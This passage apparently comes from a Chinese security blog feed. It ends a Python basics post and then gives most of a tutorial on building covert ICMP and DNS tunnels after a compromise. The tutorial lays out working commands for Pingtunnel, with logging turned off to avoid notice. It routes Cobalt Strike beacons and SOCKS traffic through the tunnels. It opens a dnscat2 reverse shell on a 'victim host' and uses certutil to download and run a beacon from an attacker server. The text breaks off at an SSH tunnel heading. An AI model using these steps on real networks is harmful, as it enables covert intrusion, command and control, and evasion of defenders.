class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line">json_str = json.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json_str)</span><br><span class="line"></span><br><span class="line">输出结果:&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中读取json</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.json&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    data = json.load(json_file)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;name&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数据写入json文件</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.json&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    json.dump(data, json_file)</span><br></pre></td></tr></table></figure></div><h3 id="time-库"><a href="#time-库" class="headerlink" title="time 库"></a>time 库</h3><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取当前时间戳</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">timestamp = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间戳:&quot;</span>, timestamp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将时间戳转换为可读时间</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">timestamp = <span class="number">1626832045</span>  <span class="comment"># 示例时间戳</span></span><br><span class="line">readable_time = time.ctime(timestamp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;可读时间:&quot;</span>, readable_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 延迟执行</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始执行&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)  <span class="comment"># 暂停2秒</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;继续执行&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录代码执行时间</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">res = requests.post(url, headers=headers, data=data) <span class="comment"># 例子，记录用户请求开始时间（start_time）和结束时间（end_time）,于 res 请求 post 数据开始记录</span></span><br><span class="line">end_time = time.time()</span><br><span class="line"></span><br><span class="line">execution_time = end_time - start_time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(execution_time)</span><br></pre></td></tr></table></figure></div><h3 id="open函数"><a href="#open函数" class="headerlink" title="open函数"></a>open函数</h3><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开文件进行读取</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件进行逐行读取</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件进行写入</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;Hello, World!\n&#x27;</span>)</span><br><span class="line">    file.write(<span class="string">&#x27;This is a new line.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件进行追加</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;This is an additional line.\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="八、参考"><a href="#八、参考" class="headerlink" title="八、参考"></a>八、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BrucessKING/CVE-2021-36749/blob/main/CVE-2021-36749.py</span><br><span class="line">https://github.com/dorkerdevil/CVE-2021-36749/blob/main/CVE-2021-36749.py</span><br><span class="line">https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-14882_rce.py</span><br><span class="line">https://blog.csdn.net/caiqiiqi/article/details/115299924</span><br><span class="line">https://blog.riskivy.com/weblogic-cve-2018-2894/</span><br></pre></td></tr></table></figure></div><blockquote><p>本文中提供的 PoC 和漏洞验证信息仅供教育和研究目的。使用此信息时，读者应该遵守所有适用的法律法规和道德规范。作者对任何因使用或滥用此信息而导致的任何损失或损害概不负责。读者应自行承担使用此信息的风险和责任。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> POC编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络隧道：突破内网的通行证</title>
      <link href="/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/"/>
      <url>/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>内网隧道（Intranet tunnel）指的是通过网络隧道的方式，将内网的服务映射到公网上，从而使得外部主机可以访问内网资源。在后渗透阶段，内网隧道的搭建可以帮助攻击者在内部网络中进行更加隐蔽和灵活的操作，从而更好地实现攻击目标。网络隧道还可以更好的帮助我们绕过内网防御、横向渗透、数据转移、隐藏攻击行为，本文简单介绍几种类型的隧道搭建。</p><h2 id="二、ICMP隧道"><a href="#二、ICMP隧道" class="headerlink" title="二、ICMP隧道"></a>二、ICMP隧道</h2><p>ICMP（Internet Control Message Protocol）Internet 控制报文协议，用于在 IP 主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。ICMP 通过 PING 命令访问远程计算机，建立 ICMP 隧道，将 TCP&#x2F;UDP 数据封装到 ICMP 的 PING 数据包中，从而穿过防火墙，因为防火墙一般不会屏蔽 PING 数据包，实现不受限制的访问。</p><h3 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>ICMP 隧道搭建使用 Pingtunnel，项目地址：<a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a> ，Pingtunnel 把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具，跨平台。</p><p>1、服务端（vps）上开启 pingtunnel 服务，我们可以看到在没有客户端连接时，接收到的数据包为 0</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -key [密钥,只限数字]</span><br><span class="line">sudo ./pingtunnel -type server -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419155830971.png" data-caption="image-20230419155830971"><img src="/../images/tunnel/image-20230419155830971.png" alt="image-20230419155830971"></a></p><p>2、客户端（受害主机）开启 pingtunenl 服务，连接服务端</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :[转发本机2222端口作为ICMP隧道通讯端口] -s [服务端IP] -[转发类型] 1 -noprint 1 -nolog 1</span><br><span class="line">pingtunnel.exe -type client -l :2222 -s 1.x.x.x -sock5 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419160801304.png" data-caption="image-20230419160801304"><img src="/../images/tunnel/image-20230419160801304.png" alt="image-20230419160801304"></a></p><p>服务端接收到数据，隧道搭建成功</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419160251896.png" data-caption="image-20230419160251896"><img src="/../images/tunnel/image-20230419160251896.png" alt="image-20230419160251896"></a></p><p>将ICMP流量转发为其它协议命令</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ICMP转发为TCP</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455 -tcp 1</span><br><span class="line"></span><br><span class="line"># ICMP转发为UDP</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455</span><br></pre></td></tr></table></figure></div><p>ICMP 隧道流量如下</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430175858624.png" data-caption="image-20230430175858624"><img src="/../images/tunnel/image-20230430175858624.png" alt="image-20230430175858624"></a></p><br/><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="Pingtunnel上线Cobaltstrike"><a href="#Pingtunnel上线Cobaltstrike" class="headerlink" title="Pingtunnel上线Cobaltstrike"></a>Pingtunnel上线Cobaltstrike</h4><p>1、按照上面步骤，先利用 Pingtunnel 搭建 ICMP 隧道</p><p>服务端（vps）</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -key 000000(连接密码,只限数字)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430175950882.png" data-caption="image-20230430175950882"><img src="/../images/tunnel/image-20230430175950882.png" alt="image-20230430175950882"></a></p><p>客户端（受害主机），这边需要将 ICMP 转发为 TCP</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l [本机IP：ICMP隧道端口] -s [服务端IP_VPS] -t [服务端IP_VPS:ICMP隧道转发至VPS的端口] -tcp 1 -noprint 1 -nolog 1 -key [密钥]</span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:2222 -s 1.x.x.x -t x.x.x.x:3333 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180113881.png" data-caption="image-20230430180113881"><img src="/../images/tunnel/image-20230430180113881.png" alt="image-20230430180113881"></a></p><p>2、Cobaltstrike 新建两个监听，一个为转发 ICMP 的 2222 端口 host 为 127.0.0.1（这个主要用于生成本地地址的 beacon），另一个监听端口为 ICMP 流量转发到 VPS 的服务端口 3333。</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180236000.png" data-caption="image-20230430180236000"><img src="/../images/tunnel/image-20230430180236000.png" alt="image-20230430180236000"></a></p><p>生成 cs 马</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180319548.png" data-caption="image-20230430180319548"><img src="/../images/tunnel/image-20230430180319548.png" alt="image-20230430180319548"></a></p><p>受害主机执行 beacon，由于 Cobaltstrike 马监听的端口是 2222 ，马儿流量通过 2222 端口，即 ICMP 隧道端口转发出去，到了服务端（VPS）上，然后 ICMP 上的流量通过 2222 转发到 3333 端口，实现间接上线。</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230421160516688.png" data-caption="image-20230421160516688"><img src="/../images/tunnel/image-20230421160516688.png" alt="image-20230421160516688"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180515064.png" data-caption="image-20230430180515064"><img src="/../images/tunnel/image-20230430180515064.png" alt="image-20230430180515064"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180805743.png" data-caption="image-20230430180805743"><img src="/../images/tunnel/image-20230430180805743.png" alt="image-20230430180805743"></a></p><br/><h4 id="Pingtunel-配合-iox-代理-socks-出网"><a href="#Pingtunel-配合-iox-代理-socks-出网" class="headerlink" title="Pingtunel 配合 iox 代理 socks 出网"></a>Pingtunel 配合 iox 代理 socks 出网</h4><p>Pingtunnel 搭建完 ICMP 隧道后，通过 iox 配合代理 Socks5 出网，以达到内网穿透。</p><p>1、服务端（VPS），Pingtunnel 搭建 ICMP 隧道，这里选择不打印日志</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100812628.png" data-caption="image-20230423100812628"><img src="/../images/tunnel/image-20230423100812628.png" alt="image-20230423100812628"></a></p><p>2、客户端（受害主机），启动 Pingtunnel ，打通 ICMP 隧道（注意 ICMP 转发方式为 TCP）</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l [本机IP：ICMP隧道端口] -s [服务端IP_VPS] -t [服务端IP_VPS:ICMP隧道转发至VPS的端口] -tcp 1 -noprint 1 -nolog 1 -key [密钥]</span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:3389 -s 1.x.x.x -t 1.x.x.x:3333 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180930005.png" data-caption="image-20230430180930005"><img src="/../images/tunnel/image-20230430180930005.png" alt="image-20230430180930005"></a></p><p>3、服务端（VPS），启动 iox 服务端，接收从 3333 端口的流量转发至 4444 端口</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./iox proxy -l 3333 -l 4444</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423104609449.png" data-caption="image-20230423104609449"><img src="/../images/tunnel/image-20230423104609449.png" alt="image-20230423104609449"></a></p><p>4、客户端（受害者），启动 iox 客户端，将 3389 流量转发出网，由于 3389 已建立 ICMP 隧道，所以 iox 代理的 Socks 流量将通过 ICMP 隧道出网。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox.exe proxy -r 127.0.0.1:3389</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423104802107.png" data-caption="image-20230423104802107"><img src="/../images/tunnel/image-20230423104802107.png" alt="image-20230423104802107"></a></p><p>服务端接收到信息，成功建立通讯</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181009608.png" data-caption="image-20230430181009608"><img src="/../images/tunnel/image-20230430181009608.png" alt="image-20230430181009608"></a></p><p>5、通过 proxifier 代理 socks 流量，实现本机访问内网</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423105015390.png" data-caption="image-20230423105015390"><img src="/../images/tunnel/image-20230423105015390.png" alt="image-20230423105015390"></a></p><p>未进行代理时，本机无法访问内网资源</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100206006.png" data-caption="image-20230423100206006"><img src="/../images/tunnel/image-20230423100206006.png" alt="image-20230423100206006"></a></p><p>代理后，本机可访问内网资源</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100458787.png" data-caption="image-20230423100458787"><img src="/../images/tunnel/image-20230423100458787.png" alt="image-20230423100458787"></a></p><h2 id="三、DNS-隧道搭建"><a href="#三、DNS-隧道搭建" class="headerlink" title="三、DNS 隧道搭建"></a>三、DNS 隧道搭建</h2><p>DNS 隧道是将其它协议的内容封装在 DNS 协议中，以 DNS 请求和响应包完成传输数据的技术。使用 DNS 隧道需要使用一个子域名来进行隧道通信，而不能直接使用主域名，因为 DNS 隧道的工作原理是将隧道数据通过 DNS 协议传输，因此需要使用一个独立的子域名来进行通信，以避免影响到主域名的解析。</p><h3 id="隧道搭建-1"><a href="#隧道搭建-1" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>DNS 隧道搭建使用 dnscat2，项目地址 <a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p><p>1、配置子域名解析，并开放 udp、tcp 53端口，这边使用腾讯云进行域名配置，如何购买不再赘述，购买完域名后，直接搜索 DNS 进入 <code>DNS 解析 DNSPod</code>，对域名添加记录 A 记录以及 NS 记录。该作用是：将NS 记录的 log.xxx.xxx 子域名下所有 DNS 解析交给 A 记录的 ns1.xxx.xxx 处理。</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181535026.png" data-caption="image-20230430181535026"><img src="/../images/tunnel/image-20230430181535026.png" alt="image-20230430181535026"></a></p><p>开放 udp、tcp 53端口</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230424093842332.png" data-caption="image-20230424093842332"><img src="/../images/tunnel/image-20230424093842332.png" alt="image-20230424093842332"></a></p><p>验证域名解析设置是否成功，能正常 PING 域名，解析正常</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181644239.png" data-caption="image-20230430181644239"><img src="/../images/tunnel/image-20230430181644239.png" alt="image-20230430181644239"></a></p><p>然后在 VPS 上使用 tcpdump 监听 udp 53 端口（ubuntu 上安装 tcpdump ：sudo apt-get install tcpdump）</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -n -i eth0 udp dst port 53</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230424093927718.png" data-caption="image-20230424093927718"><img src="/../images/tunnel/image-20230424093927718.png" alt="image-20230424093927718"></a></p><p>使用本地电脑 nslookup NS 记录值，若 vps 上 tcpdump 返回查询信息则证明环境正常</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181752847.png" data-caption="image-20230430181752847"><img src="/../images/tunnel/image-20230430181752847.png" alt="image-20230430181752847"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181955810.png" data-caption="image-20230430181955810"><img src="/../images/tunnel/image-20230430181955810.png" alt="image-20230430181955810"></a>1</p><p>3、服务端配置 dnscat2 这边使用公网 ubuntu 作为服务端，注意：使用前查看系统是否有程序占用 TCP 和 UDP 的 53 端口，若有，需要先暂停该程序 ，Ubuntu 上 systemd-resolved 会占用 53 端口，以下命令能暂停服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service systemd-resolved stop# 停止 systemd-resolved 服务</span><br><span class="line">systemctl disable systemd-resolved# 设置开机不启动</span><br></pre></td></tr></table></figure></div><p>安装 dnscat2</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2</span><br><span class="line">cd dnscat2/server</span><br><span class="line">apt install gem ruby-dev libpq-dev</span><br><span class="line">gem install bundler</span><br><span class="line">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></div><p>服务端（vps），启动 dnscat2 服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd dnscat2/server</span><br><span class="line">sudo ruby dnscat2.rb [NS上机记录.域名] -c [密钥]</span><br><span class="line">sudo ruby dnscat2.rb log.xxx.xxx -c 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182353337.png" data-caption="image-20230430182353337"><img src="/../images/tunnel/image-20230430182353337.png" alt="image-20230430182353337"></a></p><p>4、配置客户端，二进制文件下载地址：<a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a> ，客户端（受害主机）启动 dnscat2 服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-v0.07-client-win32.exe --secret=[密钥] [NS 记录值] --delay 5000</span><br><span class="line">dnscat2-v0.07-client-win32.exe --secret=000000 log.xxx.xxx --delay 5000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182441235.png" data-caption="image-20230430182441235"><img src="/../images/tunnel/image-20230430182441235.png" alt="image-20230430182441235"></a></p><p>5、查看服务端，返回一个 session 类似 msf 一般</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182555251.png" data-caption="image-20230430182555251"><img src="/../images/tunnel/image-20230430182555251.png" alt="image-20230430182555251"></a></p><p>使用 <code>session -i 1</code> 或者 <code>window -i 1</code> 进入 shell</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105649239.png" data-caption="image-20230425105649239"><img src="/../images/tunnel/image-20230425105649239.png" alt="image-20230425105649239"></a></p><p>执行 <code>shell</code> 命令，获取受害者主机反弹 <code>shell</code></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105802478.png" data-caption="image-20230425105802478"><img src="/../images/tunnel/image-20230425105802478.png" alt="image-20230425105802478"></a></p><p>执行 session -i 2 进入反弹 shell 终端</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105902471.png" data-caption="image-20230425105902471"><img src="/../images/tunnel/image-20230425105902471.png" alt="image-20230425105902471"></a></p><p>DNS隧道流量如下，中继模式没有 dnscat 关键字，但会暴露域名信息。</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182842692.png" data-caption="image-20230430182842692"><img src="/../images/tunnel/image-20230430182842692.png" alt="image-20230430182842692"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183326994.png" data-caption="image-20230430183326994"><img src="/../images/tunnel/image-20230430183326994.png" alt="image-20230430183326994"></a></p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="dnscat2-上线-Cobastrike"><a href="#dnscat2-上线-Cobastrike" class="headerlink" title="dnscat2 上线 Cobastrike"></a>dnscat2 上线 Cobastrike</h4><p>1、cobastrike 启动监听</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183458656.png" data-caption="image-20230430183458656"><img src="/../images/tunnel/image-20230430183458656.png" alt="image-20230430183458656"></a></p><p>2、服务端（VPS），启动服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby ./dnscat2.rb [NS上机记录.域名] -e open -c 000000 --no-cache</span><br><span class="line">sudo ruby ./dnscat2.rb log.xxx.xxx -e open -c 000000 --no-cache</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183801644.png" data-caption="image-20230430183801644"><img src="/../images/tunnel/image-20230430183801644.png" alt="image-20230430183801644"></a></p><p>3、客户端（受害者），启动服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-v0.07-client-win32.exe --secret=000000 log.xxx.xxx --delay 5000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183836873.png" data-caption="image-20230430183836873"><img src="/../images/tunnel/image-20230430183836873.png" alt="image-20230430183836873"></a></p><p>4、远程下载 beacon 执行上线</p><p>服务器利用 python 启临时web服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 4444</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430160918692.png" data-caption="image-20230430160918692"><img src="/../images/tunnel/image-20230430160918692.png" alt="image-20230430160918692"></a></p><p>服务端进入 shell ，通过 certutil.exe 远程下载 beacon 上线主机</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://x.x.x.x:4444/beacon.exe C:\Users\Public\beacon.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183925696.png" data-caption="image-20230430183925696"><img src="/../images/tunnel/image-20230430183925696.png" alt="image-20230430183925696"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430163507584.png" data-caption="image-20230430163507584"><img src="/../images/tunnel/image-20230430163507584.png" alt="image-20230430163507584"></a></p><p>执行 beacon.exe 实现上线</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public\beacon.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430163700295.png" data-caption="image-20230430163700295"><img src="/../images/tunnel/image-20230430163700295.png" alt="image-20230430163700295"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430184021047.png" data-caption="image-20230430184021047"><img src="/../images/tunnel/image-20230430184021047.png" alt="image-20230430184021047"></a></p><h2 id="四、SSH-隧道"><a href="#四、SSH-隧道" class="headerlink" title="四、SSH 